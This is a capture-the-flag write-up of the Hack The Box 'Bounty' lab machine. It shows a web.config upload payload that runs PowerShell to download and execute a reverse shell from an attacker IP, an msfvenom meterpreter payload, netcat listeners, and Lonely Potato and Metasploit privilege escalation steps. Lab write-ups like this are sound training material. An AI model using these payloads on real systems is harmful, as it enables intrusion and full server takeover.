@@ -1,0 +1,148 @@
+HTB-Bounty-Writeup
+
+IP : 10.10.10.93
+
+Nmap
+----
+- nmap revealed one open port
+	- port 80 running Microsoft IIS 7.5
+
+Enumeration
+-----------
+- visiting the site gives us an image of a wizard named merlin 
+- directory brute forcing the site we get two interesting paths 
+	- /transfer.aspx
+	- uploadedfiles
+
+- on checking out transfer.aspx we got an upload form
+- tried uploading few file formats and it looks like it only allows image files  
+- the uploaded files can be seen in /uploadedfiles
+- we can try to get a reverse shell out of this
+- tried downloading and uploading an aspx reverse shell but failed
+- we can intercept the request with burp and add a null byte after our aspx reverse shell so that the app thinks its an image and then save it as aspx on the machine 
+- the file uploaded successfully but when we visit /uploadedfiles and try to access it we get an error 
+- we passed the upload check but cant get execution
+- the error messages mention web.config file which is the configuration file for web applications on IIS 
+- if we could edit the web.config file things will be much more easier 
+- googling around about web.config file we found out from a post that we could include asp code in the web.config and can run it
+
+	 https://soroush.secproject.com/blog/tag/unrestricted-file-upload/
+
+- checking this out with the help of code from the post we get the desired output as 3 which means it can run asp code   
+
+Shell as merlin
+---------------
+- the files uploaded to the path /uploadedfiles is getting cleared in several minutes 
+- we need a reverse shell to enumarete this box further
+- we can choose the nishang invokeshelltcp.ps1 for this
+- copy the Nishangs InvokeShellTcp.ps1 and edit it to get a callback
+- now we need asp code to download and execute the reverse shell in the machine 
+- edit the web config file to include the asp code
+
+			 <?xml version="1.0" encoding="UTF-8"?>
+		<configuration>
+		    <system.webServer>
+		      <handlers accessPolicy="Read, Script, Write">
+		         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+		      </handlers>
+		      <security>
+		         <requestFiltering>
+		            <fileExtensions>
+		               <remove fileExtension=".config" />
+		            </fileExtensions>
+		            <hiddenSegments>
+		               <remove segment="web.config" />
+		            </hiddenSegments>
+		         </requestFiltering>
+		      </security>
+		   </system.webServer>
+		</configuration>
+		<%@ Language=VBScript %>
+		<%
+		  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.54/Invoke-PowerShellTcp.ps1')")
+		%>
+
+- now we can upload the web.config file using the web form
+- start a netcat listener
+
+	nc -nlvp 443
+
+- run it by visiting the uploadedfiles path which will execute the invoke powershell command to download the nishang reverse shell and then run it creating a connection back to us 
+- we got a shell as merlin
+- we couldnt find the user flag 
+- it turns out the user.txt is hidden
+- we can run gci with the -Force option to view it 
+
+	gci -Force
+
+- grab the user flag 
+
+Priv-esc enumeration
+--------------------
+- enumerating the system with systeminfo command 
+- there are no hotfixes installed on the machine which looks vulnerable to kernal exploits 
+- we can check what privileges we have on the machine 
+
+	whoami /priv
+
+- we got SeImpersonatePrivilege which means we can use Lonely Potato to get system on the machine 
+- we can use sherlock to look for more vulnerabilities 
+- get sherlock on the machine by hosting it using a python server and downloading it using the following code
+
+	iex(new-object net.webclient).downloadstring('http://10.10.14.54/Sherlock.ps1')
+
+- run Find-AllVulns to check for vulnerabilities 
+
+	Find-AllVulns
+
+- looks like the machine is vulnerable to MS10-092
+- more enumeration with metasploit
+- we will need a meterpreter session for this
+- generate a powershell payload using msfvenom
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.54 LPORT=445 -f psh -o www/met-445.ps1
+
+- setup a listener with necessary options in metasploit
+
+	use /multi/handler
+
+- downlaod and run the msfvenom payload from the nashang reverse shell we got earlier 
+
+	iex(new-object net.webclient).downloadstring('http://10.10.14.54/met-445.ps1')
+
+- we got a meterpreter shell
+- backgroung the session
+- use use post/multi/recon/local_exploit_suggester and run
+- this will give us a few more vulnerabilities
+
+Priv-esc 1 : Lonely Potato
+--------------------------
+- grab a copy of compiled lonely potato binary and upload it to target
+- upload a bat script which will start a nishang shell to target
+
+	(new-object net.webclient).downloadfile('http://10.10.14.54/lonelypotato.exe', 'C:\users\merlin\appdata\local\temp\lp.exe')
+	(new-object net.webclient).downloadfile('http://10.10.14.54/rev.bat', 'C:\users\merlin\appdata\local\temp\rev.bat') 
+
+- start a netcat reverse shell
+
+	nc -nlvp 9001
+
+- run the exploit 
+
+	C:\users\merlin\appdata\local\temp\lp.exe * C:\users\merlin\appdata\local\temp\rev.bat
+
+- we get root shell 
+- grab the root flag 
+
+Priv-esc 2 : kernal exploit with metasploit
+-------------------------------------------
+- use the windows/local/ms10_092_schelevator exploit from metasploit
+
+	use windows/local/ms10_092_schelevator
+
+- using windows/local/ms16_014_wmi_recv_notif works as well
+
+	use - windows/local/ms16_014_wmi_recv_notif 
+	
+- set necessary options and run
+- we get a root shell
